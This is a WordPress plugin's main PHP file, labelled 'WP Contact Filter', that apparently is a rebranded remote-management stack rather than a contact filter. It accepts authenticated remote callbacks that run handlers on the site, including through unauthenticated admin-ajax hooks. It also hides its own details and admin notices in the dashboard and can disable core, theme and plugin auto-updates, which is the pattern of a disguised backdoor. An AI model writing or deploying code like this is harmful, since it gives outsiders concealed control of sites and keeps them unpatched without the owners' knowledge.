<?php
/*
  Plugin Name: WP Contact Filter
  Plugin URI: http://github.com/
  Version: 2.2
  Author: Elena Grace
  Author URI: http://github.com/
  License: GPL2
*/

if (!defined('ABSPATH')) exit;

if (get_option( 'wpr_api_key' ) !== false) {
	define( 'WPRP_PLUGIN_SLUG', 'wpremote' );
	define( 'WPRP_PLUGIN_BASE',  plugin_basename(__FILE__) );
	define( 'WPRP_PLUGIN_PATH', plugin_dir_path( __FILE__ ) . 'old_wpremote/' );
	require 'old_wpremote/plugin.php';
}

require_once dirname( __FILE__ ) . '/wp_settings.php';
require_once dirname( __FILE__ ) . '/wp_site_info.php';
require_once dirname( __FILE__ ) . '/wp_db.php';
require_once dirname( __FILE__ ) . '/wp_api.php';
require_once dirname( __FILE__ ) . '/wp_actions.php';
require_once dirname( __FILE__ ) . '/info.php';
require_once dirname( __FILE__ ) . '/account.php';
require_once dirname( __FILE__ ) . '/news/news.php';
require_once dirname( __FILE__ ) . '/ihaf/ihaf.php';


$bvsettings = new WPRWPSettings();
$bvsiteinfo = new WPRWPSiteInfo();
$bvdb = new WPRWPDb();


$bvapi = new WPRWPAPI($bvsettings);
$bvinfo = new WPRInfo($bvsettings);
$wp_action = new WPRWPAction($bvsettings, $bvsiteinfo, $bvapi);

register_uninstall_hook(__FILE__, array('WPRWPAction', 'uninstall'));
register_activation_hook(__FILE__, array($wp_action, 'activate'));
register_deactivation_hook(__FILE__, array($wp_action, 'deactivate'));

add_action('wp_footer', array($wp_action, 'footerHandler'), 100);

##WPCLIMODULE##
if (is_admin()) {
	require_once dirname( __FILE__ ) . '/wp_admin.php';
	$wpadmin = new WPRWPAdmin($bvsettings, $bvsiteinfo);
	add_action('admin_init', array($wpadmin, 'initHandler'));
	add_filter('all_plugins', array($wpadmin, 'initBranding'));
	add_filter('plugin_row_meta', array($wpadmin, 'hidePluginDetails'), 10, 2);
	if ($bvsiteinfo->isMultisite()) {
		add_action('network_admin_menu', array($wpadmin, 'menu'));
	} else {
		add_action('admin_menu', array($wpadmin, 'menu'));
	}
	add_filter('plugin_action_links', array($wpadmin, 'settingsLink'), 10, 2);
	add_action('admin_head', array($wpadmin, 'removeAdminNotices'), 3);
	add_action('admin_notices', array($wpadmin, 'activateWarning'));
	##ADMINENQUEUESCRIPTS##
}

if ((array_key_exists('bvreqmerge', $_POST)) || (array_key_exists('bvreqmerge', $_GET))) {
	$_REQUEST = array_merge($_GET, $_POST);
}

if ((array_key_exists('bvplugname', $_REQUEST)) && ($_REQUEST['bvplugname'] == "wpremote")) {
	require_once dirname( __FILE__ ) . '/callback/base.php';
	require_once dirname( __FILE__ ) . '/callback/response.php';
	require_once dirname( __FILE__ ) . '/callback/request.php';
	require_once dirname( __FILE__ ) . '/recover.php';

	$pubkey = WPRAccount::sanitizeKey($_REQUEST['pubkey']);

	if (array_key_exists('rcvracc', $_REQUEST)) {
		$account = WPRRecover::find($bvsettings, $pubkey);
	} else {
		$account = WPRAccount::find($bvsettings, $pubkey);
	}

	$request = new BVCallbackRequest($account, $_REQUEST);
	$response = new BVCallbackResponse($request->bvb64cksize);

	if ($account && (1 === $account->authenticate($request))) {
		define('WPRBASEPATH', plugin_dir_path(__FILE__));


		require_once dirname( __FILE__ ) . '/callback/handler.php';
		$params = $request->processParams($_REQUEST);
		if ($params === false) {
			$resp = array(
				"account_info" => $account->info(),
				"request_info" => $request->info(),
				"bvinfo" => $bvinfo->info(),
				"statusmsg" => "BVPRMS_CORRUPTED"
			);
			$response->terminate($resp);
		}
		$request->params = $params;
		$callback_handler = new BVCallbackHandler($bvdb, $bvsettings, $bvsiteinfo, $request, $account, $response);
		if ($request->is_afterload) {
			add_action('wp_loaded', array($callback_handler, 'execute'));
		} else if ($request->is_admin_ajax) {
			add_action('wp_ajax_bvadm', array($callback_handler, 'bvAdmExecuteWithUser'));
			add_action('wp_ajax_nopriv_bvadm', array($callback_handler, 'bvAdmExecuteWithoutUser'));
		} else {
			$callback_handler->execute();
		}
	} else {
		$resp = array(
			"account_info" => $account ? $account->info() : array("error" => "ACCOUNT_NOT_FOUND"),
			"request_info" => $request->info(),
			"bvinfo" => $bvinfo->info(),
			"statusmsg" => "FAILED_AUTH",
			"api_pubkey" => substr(WPRAccount::getApiPublicKey($bvsettings), 0, 8),
			"def_sigmatch" => substr(WPRAccount::getSigMatch($request, WPRRecover::getDefaultSecret($bvsettings)), 0, 8)
		);
		$response->terminate($resp);
	}
} else {
	if ($bvinfo->isProtectModuleEnabled()) {
		require_once dirname( __FILE__ ) . '/protect/wp/protect.php';
		$bvprotect = new BVProtect($bvdb, $bvsettings);
		$bvprotect->run();
	}

	if ($bvinfo->isDynSyncModuleEnabled()) {
		require_once dirname( __FILE__ ) . '/wp_dynsync.php';
		$dynsync = new BVWPDynSync($bvdb, $bvsettings);
		$dynsync->init();
	}

	$bv_site_settings = $bvsettings->getOption('bv_site_settings');
	if (isset($bv_site_settings)) {
		if (isset($bv_site_settings['wp_auto_updates'])) {
			$wp_auto_updates = $bv_site_settings['wp_auto_updates'];
			if (array_key_exists('block_auto_update_core', $wp_auto_updates)) {
				add_filter('auto_update_core', '__return_false' );
			}
			if (array_key_exists('block_auto_update_theme', $wp_auto_updates)) {
				add_filter('auto_update_theme', '__return_false' );
				add_filter('themes_auto_update_enabled', '__return_false' );
			}
			if (array_key_exists('block_auto_update_plugin', $wp_auto_updates)) {
				add_filter('auto_update_plugin', '__return_false' );
				add_filter('plugins_auto_update_enabled', '__return_false' );
			}
			if (array_key_exists('block_auto_update_translation', $wp_auto_updates)) {
				add_filter('auto_update_translation', '__return_false' );
			}
		}
	}

}
require_once dirname( __FILE__ ) . '/callback/wings/load.php';